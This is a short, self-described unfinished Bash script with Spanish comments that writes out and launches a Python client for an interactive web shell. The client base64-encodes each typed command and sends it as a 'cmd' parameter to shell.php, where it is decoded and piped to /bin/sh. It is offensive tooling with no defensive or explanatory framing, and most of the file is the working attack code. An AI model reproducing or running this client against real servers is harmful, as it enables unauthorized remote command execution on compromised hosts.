#!/bin/bash
: ' 
	crear una plataforma de despliegue de shell sobre la web
	** no esta terminado **
'
# colors
green=32; red=31; blue=34; yellow=33; purple=35; cian=36; gray=37
function color()
{
	colorcode="$1"
	echo -e "\e[3;${colorcode};40m ${@:2} \e[m"
}

# exit
trap ctrl_c INT
function ctrl_c()
{
	color "$red" 'Saliendo... [!]'
}

function pythonscript()
{
cat << 'SCRIPT'
#!/usr/bin/python3
import requests, sys, signal, time
from base64 import b64encode
def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	sys.exit(0)
signal.signal(signal.SIGINT, sig_handler)
def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d | /bin/sh' % (cmd)
	}
	result = requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text
	return result
while True:
	cmd = input("$~ ")
	response = RunCmd(cmd)
	print(response)
SCRIPT
}


(pythonscript > webshell.py; chmod +x webshell.py; ./webshell.py)